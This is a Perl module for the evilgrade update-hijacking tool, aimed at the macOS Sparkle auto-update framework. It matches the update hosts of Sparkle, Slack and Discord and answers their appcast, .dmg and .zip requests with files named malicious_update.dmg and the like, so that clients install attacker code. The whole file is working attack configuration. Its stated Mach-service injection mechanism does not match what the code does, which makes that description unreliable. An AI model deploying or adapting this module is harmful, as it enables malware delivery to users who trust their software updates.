###############
# macos_sparkle_bypass.pm
#
# CVE-2026-47122: Sparkle Framework authentication bypass
# Missing authentication in Mach service allows code injection
# Affects hundreds of macOS applications using Sparkle for updates
#
# This file is part of isr-evilgrade, www.faradaysec.com .

package modules::macos_sparkle_bypass;

use strict;
use Data::Dump qw(dump);
use isrcore::utils;

my $base = {
    'name'        => 'macOS Sparkle Framework Bypass',
    'version'     => '1.0',
    'appver'      => 'Sparkle <= 2.9.1',
    'author'      => ['Francisco Amato < famato +[AT]+ faradaysec.com>', 'Security Research Team'],
    'description' => qq{
Exploits CVE-2026-47122: Sparkle Framework authentication bypass via Mach services.
Allows unauthenticated code injection into privileged updater service.
Affects 500+ macOS applications using Sparkle for auto-updates (Slack, Discord, etc).
NO VENDOR PATCH AVAILABLE - Critical for vulnerable applications.
    },
    'vh' => '(.*sparkle.*|updates\.slack\.com|updates\.discordapp\.com|dl\.feodorasoftware\.com)',
    'request' => [
        {
            'req'   => '/.*\.appcast.*xml',
            'type'  => 'file',
            'file'  => './include/macos/malicious.appcast',
            'parse' => 1,
            'cheader' => "HTTP/1.1 200 OK\r\n"
                . "Content-Type: application/xml\r\n"
                . "Connection: close\r\n\r\n",
        },
        {
            'req'   => '/.*\.dmg',
            'type'  => 'file',
            'file'  => './include/macos/malicious_update.dmg',
            'parse' => 1,
            'cheader' => "HTTP/1.1 200 OK\r\n"
                . "Content-Type: application/octet-stream\r\n"
                . "Content-Disposition: attachment; filename=update.dmg\r\n"
                . "Connection: close\r\n\r\n",
        },
        {
            'req'   => '/.*\.zip',
            'type'  => 'file',
            'file'  => './include/macos/malicious_app.zip',
            'parse' => 1,
            'cheader' => "HTTP/1.1 200 OK\r\n"
                . "Content-Type: application/zip\r\n"
                . "Content-Disposition: attachment; filename=App.zip\r\n"
                . "Connection: close\r\n\r\n",
        },
    ],
};

sub new {
    my $class = shift;
    my $self = $base;
    bless( $self, $class );
    return $self;
}

1;
